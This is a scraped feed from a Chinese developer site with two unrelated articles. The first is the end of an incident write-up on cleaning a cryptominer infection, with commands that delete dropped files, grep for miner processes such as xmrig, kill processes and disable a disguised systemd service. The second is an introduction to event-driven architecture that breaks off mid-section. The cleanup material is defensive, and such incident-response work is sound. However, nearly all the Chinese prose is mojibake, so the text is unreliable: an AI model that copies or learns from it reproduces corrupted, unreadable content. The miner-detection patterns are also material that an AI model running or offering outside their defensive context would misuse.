<span class="hljs-built_in">rm</span>Â -fÂ /tmp/nginx3
<span class="hljs-built_in">rm</span>Â -fÂ /tmp/x86
</code></pre>
<p>å…‰åˆ é™¤æ–‡ä»¶è¿˜ä¸å¤Ÿï¼Œè¿˜è¦æŸ¥æ‰¾å¹¶ç»ˆæ­¢æ‰€æœ‰æ¶æ„è¿›ç¨‹ï¼š</p>
<pre><code class="hljs language-perl" lang="perl"><span class="hljs-comment"># æŸ¥æ‰¾ xmrig è¿›ç¨‹</span>
psÂ aux |Â <span class="hljs-keyword">grep</span>Â -EÂ <span class="hljs-string">"(xmrig|minerd|cpuminer)"</span>Â |Â <span class="hljs-keyword">grep</span>Â -vÂ <span class="hljs-keyword">grep</span>
â€‹
<span class="hljs-comment"># æŸ¥æ‰¾å¯ç–‘è¿›ç¨‹</span>
psÂ aux |Â <span class="hljs-keyword">grep</span>Â -EÂ <span class="hljs-string">"(nginx3|/tmp/|/dev/shm)"</span>Â |Â <span class="hljs-keyword">grep</span>Â -vÂ <span class="hljs-keyword">grep</span>
â€‹
<span class="hljs-comment"># æŸ¥çœ‹è¢«åˆ é™¤ä½†ä»åœ¨è¿è¡Œçš„è¿›ç¨‹</span>
lsÂ -lÂ /proc/*<span class="hljs-regexp">/exeÂ 2&gt;/d</span>ev/null |Â <span class="hljs-keyword">grep</span>Â deleted
â€‹
<span class="hljs-comment"># ç»ˆæ­¢è¿›ç¨‹</span>
<span class="hljs-keyword">kill</span>Â -<span class="hljs-number">9</span>Â &lt;PID&gt;
</code></pre>
<p>æœ€åï¼Œè¿˜è¦åœæ­¢æ¶æ„çš„ systemd æœåŠ¡ï¼š</p>
<pre><code class="hljs language-sql" lang="sql"># æŸ¥æ‰¾å¯ç–‘æœåŠ¡
systemctl list<span class="hljs-operator">-</span>unitsÂ <span class="hljs-comment">--type=serviceÂ |Â grepÂ -EÂ "(update|system|miner|crypto)"</span>
â€‹
# ç¤ºä¾‹è¾“å‡º
<span class="hljs-keyword">system</span><span class="hljs-operator">-</span><span class="hljs-keyword">update</span><span class="hljs-operator">-</span>service.service Â  loaded active <span class="hljs-keyword">running</span> Â  <span class="hljs-keyword">System</span> <span class="hljs-keyword">Update</span> Service
â€‹
# åœæ­¢å¹¶ç¦ç”¨
systemctlÂ stopÂ <span class="hljs-keyword">system</span><span class="hljs-operator">-</span><span class="hljs-keyword">update</span><span class="hljs-operator">-</span>service
systemctl disable <span class="hljs-keyword">system</span><span class="hljs-operator">-</span><span class="hljs-keyword">update</span><span class="hljs-operator">-</span>service
â€‹
# åˆ é™¤æœåŠ¡æ–‡ä»¶
rmÂ <span class="hljs-operator">-</span>fÂ <span class="hljs-operator">/</span>etc<span class="hljs-operator">/</span>systemd<span class="hljs-operator">/</span><span class="hljs-keyword">system</span><span class="hljs-operator">/</span><span class="hljs-keyword">system</span><span class="hljs-operator">-</span><span class="hljs-keyword">update</span><span class="hljs-operator">-</span>service.service
â€‹
# é‡æ–°åŠ è½½
systemctl daemon<span class="hljs-operator">-</span>reload
</code></pre>
<p>å½“ç„¶ï¼Œå¦‚æœä½ çš„æœåŠ¡å™¨ä¸Šæœ¬æ¥å°±æ²¡ä»€ä¹ˆä¸œè¥¿ï¼Œä¹Ÿå¯ä»¥é€‰æ‹©ç®€å•ç²—æš´çš„æ–¹å¼ï¼Œé‡è£…ç³»ç»Ÿï¼</p>
<p>ä¸è¿‡æœ€é‡è¦çš„æ˜¯ï¼Œè¦è§£å†³æ ¹æœ¬é—®é¢˜ï¼ŒæŠŠ Next.js åº”ç”¨å‡çº§åˆ°å®‰å…¨ç‰ˆæœ¬ã€‚</p>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/a1171b92b9074552849bffc44873b763~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg56iL5bqP5ZGY6bG855qu:q75.awebp?rk3s=f64ab15b&amp;x-expires=1765769386&amp;x-signature=R2%2FMl371EPgH5%2BGfMRaQOaqoNbI%3D" alt="" loading="lazy"/></p>
<h2 data-id="heading-7">æœ€å</h2>
<p>é€šè¿‡è¿™æ¬¡äº‹æ•…å‘¢ï¼Œæˆ‘è§‰å¾—å¤šå…³æ³¨å®‰å…¨é€šå‘Šã€åšå¥½æœåŠ¡å™¨çš„å®‰å…¨ç›‘æ§è¿˜æ˜¯éå¸¸é‡è¦çš„ï¼Œè¦æ˜¯æ²¡æœ‰å®‰å…¨å‘Šè­¦ï¼Œå¯èƒ½å‡ ä¸ªæœˆéƒ½æ²¡åŠæ³•æ„è¯†åˆ°è¿™äº›æ”»å‡»ã€‚</p>
<p>è€Œä¸”å»ºè®®å¤§å®¶æŠŠåº”ç”¨å°½é‡è¿è¡Œåœ¨é root æƒé™ä¸‹ï¼Œå°½å¯èƒ½å‡å°‘é£é™©ã€‚å¹³æ—¶å…»æˆå®šæœŸå¤‡ä»½çš„ä¹ æƒ¯ï¼Œå‡ºäº†é—®é¢˜å³ä½¿é‡æ–°å®‰è£…æœåŠ¡å™¨ï¼Œä¹Ÿä¸ä¼šé€ æˆæ•°æ®ä¸¢å¤±ã€‚</p>
<p>OK å°±åˆ†äº«åˆ°è¿™é‡Œå§ï¼Œå¦‚æœä½ è§‰å¾—æœ¬æœŸå†…å®¹æœ‰å¸®åŠ©ï¼Œè®°å¾— <strong>è½¬å‘åˆ†äº«</strong> ç»™èº«è¾¹çš„ç¨‹åºå‘˜æœ‹å‹ï¼Œè®©ä»–ä»¬å°½å¿«æ„è¯†åˆ°å¹¶ä¿®å¤é—®é¢˜ï¼Œä¸è¦å†è®©ä¸‘é™‹çš„ã€å‘é„™çš„ã€è€å¥¸å·¨çŒ¾çš„æ”»å‡»è€…å¾—é€äº†ï¼</p>
<h2 data-id="heading-8">æ›´å¤š</h2>
<p>ğŸ’» ç¼–ç¨‹å­¦ä¹ äº¤æµï¼š<a href="https://link.juejin.cn?target=https%3A%2F%2Fgithub.com%2Fliyupi%2Fcode-nav" target="_blank" title="https://github.com/liyupi/code-nav" ref="nofollow noopener noreferrer">ç¼–ç¨‹å¯¼èˆª</a> ğŸ“ƒ ç®€å†å¿«é€Ÿåˆ¶ä½œï¼š<a href="https://link.juejin.cn?target=https%3A%2F%2Fgithub.com%2Fliyupi%2Flaoyujianli" target="_blank" title="https://github.com/liyupi/laoyujianli" ref="nofollow noopener noreferrer">è€é±¼ç®€å†</a> âœï¸ é¢è¯•åˆ·é¢˜ç¥å™¨ï¼š<a href="https://link.juejin.cn?target=https%3A%2F%2Fgithub.com%2Fliyupi%2Fmianshiya" target="_blank" title="https://github.com/liyupi/mianshiya" ref="nofollow noopener noreferrer">é¢è¯•é¸­</a></p></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[Gopher å¸¦ä½ å­¦äº‹ä»¶é©±åŠ¨æ¶æ„ï¼šä»åŒæ­¥åˆ°å¼‚æ­¥çš„ç³»ç»Ÿè¿›åŒ–ä¹‹è·¯]]></title>    <link>https://juejin.cn/post/7580616979473399814</link>    <guid>https://juejin.cn/post/7580616979473399814</guid>    <pubDate>2025-12-08T03:31:17.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7580616979473399814" data-draft-id="7580740782932623402" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="Gopher å¸¦ä½ å­¦äº‹ä»¶é©±åŠ¨æ¶æ„ï¼šä»åŒæ­¥åˆ°å¼‚æ­¥çš„ç³»ç»Ÿè¿›åŒ–ä¹‹è·¯"/> <meta itemprop="keywords" content="æ¶æ„"/> <meta itemprop="datePublished" content="2025-12-08T03:31:17.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="æ²¡å¤šå°‘é€»è¾‘"/> <meta itemprop="url" content="https://juejin.cn/user/2717648475395325"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="æ˜é‡‘"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            Gopher å¸¦ä½ å­¦äº‹ä»¶é©±åŠ¨æ¶æ„ï¼šä»åŒæ­¥åˆ°å¼‚æ­¥çš„ç³»ç»Ÿè¿›åŒ–ä¹‹è·¯
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/2717648475395325/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    æ²¡å¤šå°‘é€»è¾‘
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2025-12-08T03:31:17.000Z" title="Mon Dec 08 2025 03:31:17 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2025-12-08
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    é˜…è¯»6åˆ†é’Ÿ
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><p>æ˜¯å¦è§‰å¾—ç³»ç»Ÿè€¦åˆå¤ªç´§ã€æ‰©å±•å›°éš¾ã€æ€§èƒ½ç“¶é¢ˆé¢‘ç°ï¼Ÿåˆ«æ‹…å¿ƒï¼Œè¿™ç¯‡æŒ‡å—ä¸ºä½ ä»‹ç»<strong>äº‹ä»¶é©±åŠ¨æ¶æ„ï¼ˆEvent-Driven Architecture, EDAï¼‰</strong> çš„æ ¸å¿ƒæ¦‚å¿µï¼Œæ‹’ç»çƒ§è„‘ï¼Œä¸»æ‰“è½»æ¾æ˜“æ‡‚ã€‚æˆ‘ä»¬å°† EDA çš„å­¦ä¹ ä¹‹æ—…åˆ†ä¸ºä¸‰ä¸ªé˜¶æ®µï¼š<strong>ç†å¿µã€æ ¸å¿ƒç»„ä»¶ã€å®æˆ˜æ¨¡å¼</strong>ã€‚è®©æˆ‘ä»¬è·Ÿéš Gopher çš„è„šæ­¥ï¼Œä¸€èµ·æ¢ç´¢å¼‚æ­¥è§£è€¦çš„ä¸–ç•Œå§ï¼</p>
<hr/>
<h2 data-id="heading-0">ç¬¬ä¸€éƒ¨åˆ†ï¼šç†å¿µç¯‡ (The Philosophy)</h2>
<p>åœ¨å¼€å§‹å†™ä»£ç ä¹‹å‰ï¼Œæˆ‘ä»¬éœ€è¦å…ˆç†è§£ä¸ºä»€ä¹ˆéœ€è¦äº‹ä»¶é©±åŠ¨ã€‚EDA é¦–å…ˆæ˜¯ä¸€ç§æ¶æ„æ€æƒ³ï¼Œå…¶æ¬¡æ‰æ˜¯æŠ€æœ¯å®ç°ã€‚</p>
<h3 data-id="heading-1">â‘  ä¸ºä»€ä¹ˆéœ€è¦äº‹ä»¶é©±åŠ¨æ¶æ„ï¼Ÿ</h3>
<p><strong>ä¸€å¥è¯æ¦‚å¿µ</strong>ï¼šäº‹ä»¶é©±åŠ¨æ¶æ„æ˜¯ç”¨å¼‚æ­¥æ¶ˆæ¯å¯¹æŠ—ç³»ç»Ÿè€¦åˆçš„è®¾è®¡æ–¹æ³•ã€‚</p>
<ul>
<li>
<p><strong>å®ƒæ˜¯ä»€ä¹ˆï¼Ÿ</strong><br/>
è®©ç³»ç»Ÿç»„ä»¶é€šè¿‡<strong>äº‹ä»¶</strong>è¿›è¡Œé€šä¿¡ï¼Œè€Œä¸æ˜¯ç›´æ¥è°ƒç”¨ã€‚å‘é€æ–¹å‘å‡ºäº‹ä»¶åç«‹å³è¿”å›ï¼Œæ¥æ”¶æ–¹å¼‚æ­¥å¤„ç†ï¼Œå½¼æ­¤ä¸éœ€è¦çŸ¥é“å¯¹æ–¹çš„å­˜åœ¨ã€‚</p>
</li>
<li>
<p><strong>ä¸ºä»€ä¹ˆéœ€è¦å®ƒï¼Ÿ</strong><br/>
å¦‚æœæ²¡æœ‰ EDAï¼Œç³»ç»Ÿç»„ä»¶ä¼šç´§å¯†è€¦åˆï¼Œä¸€ä¸ªæœåŠ¡çš„æ•…éšœä¼šçº§è”å½±å“æ•´ä¸ªç³»ç»Ÿï¼Œæ‰©å±•æ€§å·®ï¼Œæ€§èƒ½ç“¶é¢ˆæ˜æ˜¾ã€‚</p>
</li>
</ul>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/eedc4670afa24c7cbea5e3326bf0151d~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5rKh5aSa5bCR6YC76L6R:q75.awebp?rk3s=f64ab15b&amp;x-expires=1765769477&amp;x-signature=8nCeVHw7ZyPBoUAcoIL4DB%2FdcfM%3D" alt="image.png" loading="lazy"/></p>
<h3 data-id="heading-2">â‘¡ äº‹ä»¶ï¼ˆEventï¼‰</h3>
<p><strong>ä¸€å¥è¯æ¦‚å¿µ</strong>ï¼šäº‹ä»¶æ˜¯ç³»ç»Ÿä¸­å·²ç»å‘ç”Ÿçš„ä¸šåŠ¡äº‹å®ã€‚</p>
<ul>
<li>
<p><strong>å®ƒæ˜¯ä»€ä¹ˆï¼Ÿ</strong><br/>
äº‹ä»¶æ˜¯ä¸å¯å˜çš„æ¶ˆæ¯ï¼Œæè¿°äº†"ä»€ä¹ˆæ—¶å€™å‘ç”Ÿäº†ä»€ä¹ˆäº‹"ã€‚ä¾‹å¦‚ï¼š"è®¢å•å·²åˆ›å»º"ã€"æ”¯ä»˜å·²å®Œæˆ"ã€"åº“å­˜å·²æ‰£å‡"ã€‚</p>
</li>
<li>
<p><strong>ä¸ºä»€ä¹ˆéœ€è¦å®ƒï¼Ÿ</strong><br/>
äº‹ä»¶æ˜¯ EDA çš„åŸºç¡€å•å…ƒã€‚é€šè¿‡äº‹ä»¶ï¼Œç³»ç»Ÿå¯ä»¥è®°å½•ä¸šåŠ¡å†å²ï¼Œå®ç°æ—¶é—´æ—…è¡Œï¼ˆEvent Sourcingï¼‰ï¼Œä¹Ÿèƒ½è®©å¤šä¸ªæœåŠ¡å¯¹åŒä¸€ä¸šåŠ¡äº‹å®åšå‡ºä¸åŒå“åº”ã€‚</p>
</li>
</ul>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/3f45ed63ab384189a1aa2cf1c3641725~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5rKh5aSa5bCR6YC76L6R:q75.awebp?rk3s=f64ab15b&amp;x-expires=1765769477&amp;x-signature=Ofg9SIIQtrzZDB2Cpn1ZafC8yWA%3D" alt="image.png" loading="lazy"/></p>
<h3 data-id="heading-3">â‘¢ å‘å¸ƒ-è®¢é˜…æ¨¡å¼ï¼ˆPub/Subï¼‰</h3>
<p><strong>ä¸€å¥è¯æ¦‚å¿µ</strong>ï¼šå‘å¸ƒè€…å’Œè®¢é˜…è€…é€šè¿‡äº‹ä»¶è§£è€¦ã€‚</p>
<ul>
<li>
<p><strong>å®ƒæ˜¯ä»€ä¹ˆï¼Ÿ</strong><br/>
å‘å¸ƒè€…ï¼ˆPublisherï¼‰å‘å¸ƒäº‹ä»¶ï¼Œè®¢é˜…è€…ï¼ˆSubscriberï¼‰è®¢é˜…æ„Ÿå…´è¶£çš„äº‹ä»¶ã€‚å‘å¸ƒè€…ä¸éœ€è¦çŸ¥é“è°åœ¨ç›‘å¬ï¼Œè®¢é˜…è€…ä¹Ÿä¸éœ€è¦çŸ¥é“è°å‘å¸ƒäº†äº‹ä»¶ã€‚</p>
</li>
<li>
<p><strong>ä¸ºä»€ä¹ˆéœ€è¦å®ƒï¼Ÿ</strong><br/>
Pub/Sub æ˜¯ EDA çš„æ ¸å¿ƒé€šä¿¡æ¨¡å¼ã€‚å®ƒå®ç°äº†å®Œå…¨è§£è€¦ï¼Œæ–°å¢è®¢é˜…è€…ä¸éœ€è¦ä¿®æ”¹å‘å¸ƒè€…ä»£ç ï¼Œç³»ç»Ÿæ‰©å±•æ€§æå¼ºã€‚</p>
</li>
</ul>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/3ce463a20ab543938f5190c29e6faf25~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5rKh5aSa5bCR6YC76L6R:q75.awebp?rk3s=f64ab15b&amp;x-expires=1765769477&amp;x-signature=C8URj1ZzCQN6PqPxdMnXbht8%2FSk%3D" alt="image.png" loading="lazy"/></p>
<h2 data-id="heading-4">ç¬¬äºŒéƒ¨åˆ†ï¼šæ ¸å¿ƒç»„ä»¶ç¯‡ (Core Components)</h2>
<p>ç†è§£äº† EDA çš„ç†å¿µåï¼Œæˆ‘ä»¬éœ€è¦å…·ä½“çš„"ç§¯æœ¨"æ¥æ„å»ºäº‹ä»¶é©±åŠ¨ç³»ç»Ÿã€‚</p>
<h3 data-id="heading-5">â‘£ äº‹ä»¶æ€»çº¿ï¼ˆEvent Busï¼‰</h3>
<p><strong>ä¸€å¥è¯æ¦‚å¿µ</strong>ï¼šäº‹ä»¶æ€»çº¿æ˜¯äº‹ä»¶çš„ä¸­å¤®ä¼ è¾“é€šé“ã€‚</p>
<ul>
<li>
<p><strong>å®ƒæ˜¯ä»€ä¹ˆï¼Ÿ</strong><br/>
äº‹ä»¶æ€»çº¿è´Ÿè´£æ¥æ”¶ã€è·¯ç”±å’Œåˆ†å‘äº‹ä»¶ã€‚å¸¸è§å®ç°åŒ…æ‹¬ Kafkaã€RabbitMQã€AWS EventBridge ç­‰ã€‚</p>
</li>
<li>
<p><strong>ä¸ºä»€ä¹ˆéœ€è¦å®ƒï¼Ÿ</strong><br/>
å¦‚æœæ²¡æœ‰äº‹ä»¶æ€»çº¿ï¼Œå‘å¸ƒè€…éœ€è¦ç›´æ¥è°ƒç”¨æ¯ä¸ªè®¢é˜…è€…ï¼Œåˆå›åˆ°äº†ç´§è€¦åˆçš„è€è·¯ã€‚äº‹ä»¶æ€»çº¿æ˜¯ EDA çš„"ç¥ç»ä¸­æ¢"ã€‚</p>
</li>
</ul>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/3fdc11ec3e9a42d896cfa5e637ed5644~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5rKh5aSa5bCR6YC76L6R:q75.awebp?rk3s=f64ab15b&amp;x-expires=1765769477&amp;x-signature=4kuOinODbZrfvaNz3uhYCme8WTY%3D" alt="image.png" loading="lazy"/></p>
<h3 data-id="heading-6">â‘¤ äº‹ä»¶ç”Ÿäº§è€…ï¼ˆEvent Producerï¼‰</h3>
<p><strong>ä¸€å¥è¯æ¦‚å¿µ</strong>ï¼šäº‹ä»¶ç”Ÿäº§è€…è´Ÿè´£å‘å¸ƒäº‹ä»¶ã€‚</p>
<ul>
<li>
<p><strong>å®ƒæ˜¯ä»€ä¹ˆï¼Ÿ</strong><br/>
å½“ä¸šåŠ¡æ“ä½œå®Œæˆåï¼Œç”Ÿäº§è€…å°†äº‹ä»¶å‘é€åˆ°äº‹ä»¶æ€»çº¿ã€‚ä¾‹å¦‚ï¼Œè®¢å•æœåŠ¡åœ¨åˆ›å»ºè®¢å•åå‘å¸ƒ"OrderCreated"äº‹ä»¶ã€‚</p>
</li>
<li>
<p><strong>ä¸ºä»€ä¹ˆéœ€è¦å®ƒï¼Ÿ</strong><br/>
ç”Ÿäº§è€…æ˜¯ä¸šåŠ¡çŠ¶æ€å˜åŒ–çš„"å¹¿æ’­å‘˜"ã€‚é€šè¿‡å‘å¸ƒäº‹ä»¶ï¼Œå®ƒè®©ç³»ç»Ÿçš„å…¶ä»–éƒ¨åˆ†èƒ½å¤ŸåŠæ—¶å“åº”ä¸šåŠ¡å˜åŒ–ã€‚</p>
</li>
</ul>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/4494ab58a79f462b800d1ab3f6fc70a2~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5rKh5aSa5bCR6YC76L6R:q75.awebp?rk3s=f64ab15b&amp;x-expires=1765769477&amp;x-signature=sOtlVpUxSn1%2B%2F01xbYLuIfYj%2FDg%3D" alt="image.png" loading="lazy"/></p>
<h3 data-id="heading-7">â‘¥ äº‹ä»¶æ¶ˆè´¹è€…ï¼ˆEvent Consumerï¼‰</h3>
<p><strong>ä¸€å¥è¯æ¦‚å¿µ</strong>ï¼šäº‹ä»¶æ¶ˆè´¹è€…è®¢é˜…å¹¶å¤„ç†äº‹ä»¶ã€‚</p>
<ul>
<li>
<p><strong>å®ƒæ˜¯ä»€ä¹ˆï¼Ÿ</strong><br/>
æ¶ˆè´¹è€…ç›‘å¬äº‹ä»¶æ€»çº¿ï¼Œå½“æ„Ÿå…´è¶£çš„äº‹ä»¶åˆ°è¾¾æ—¶ï¼Œæ‰§è¡Œç›¸åº”çš„ä¸šåŠ¡é€»è¾‘ã€‚ä¾‹å¦‚ï¼Œåº“å­˜æœåŠ¡ç›‘å¬"OrderCreated"äº‹ä»¶å¹¶æ‰£å‡åº“å­˜ã€‚</p>
</li>
<li>
<p><strong>ä¸ºä»€ä¹ˆéœ€è¦å®ƒï¼Ÿ</strong><br/>
æ¶ˆè´¹è€…æ˜¯äº‹ä»¶çš„"å“åº”è€…"ã€‚å¤šä¸ªæ¶ˆè´¹è€…å¯ä»¥ç‹¬ç«‹å¤„ç†åŒä¸€äº‹ä»¶ï¼Œå®ç°ä¸šåŠ¡é€»è¾‘çš„å¹¶è¡ŒåŒ–å’Œæ¨¡å—åŒ–ã€‚</p>
</li>
</ul>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/1b40272a42384d4b8c9d0b0703076b08~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5rKh5aSa5bCR6YC76L6R:q75.awebp?rk3s=f64ab15b&amp;x-expires=1765769477&amp;x-signature=8YH3vUmFPtAUUckFqYjRxPuhItI%3D" alt="image.png" loading="lazy"/></p>
<h3 data-id="heading-8">â‘¦ äº‹ä»¶å­˜å‚¨ï¼ˆEvent Storeï¼‰</h3>
<p><strong>ä¸€å¥è¯æ¦‚å¿µ</strong>ï¼šäº‹ä»¶å­˜å‚¨ä¿å­˜æ‰€æœ‰å†å²äº‹ä»¶ã€‚</p>
<ul>
<li>
<p><strong>å®ƒæ˜¯ä»€ä¹ˆï¼Ÿ</strong><br/>
äº‹ä»¶å­˜å‚¨æ˜¯ä¸€ä¸ªåªè¿½åŠ ï¼ˆAppend-Onlyï¼‰çš„æ•°æ®åº“ï¼Œè®°å½•ç³»ç»Ÿä¸­å‘ç”Ÿçš„æ‰€æœ‰äº‹ä»¶ã€‚å®ƒæ˜¯ Event Sourcing æ¨¡å¼çš„æ ¸å¿ƒã€‚</p>
</li>
<li>
<p><strong>ä¸ºä»€ä¹ˆéœ€è¦å®ƒï¼Ÿ</strong><br/>
æœ‰äº†äº‹ä»¶å­˜å‚¨ï¼Œç³»ç»Ÿå¯ä»¥"é‡æ”¾"å†å²ï¼Œæ¢å¤ä»»æ„æ—¶åˆ»çš„çŠ¶æ€ï¼Œå®ç°å®¡è®¡ã€è°ƒè¯•å’Œæ—¶é—´æ—…è¡ŒåŠŸèƒ½ã€‚</p>
</li>
</ul>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/2866d6747cce4205bb0e8069703e3cd9~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5rKh5aSa5bCR6YC76L6R:q75.awebp?rk3s=f64ab15b&amp;x-expires=1765769477&amp;x-signature=G37CaJ02onwDfEeYh0gE3yyoBgc%3D" alt="image.png" loading="lazy"/></p>
<h3 data-id="heading-9">â‘§ äº‹ä»¶æº¯æºï¼ˆEvent Sourcingï¼‰</h3>
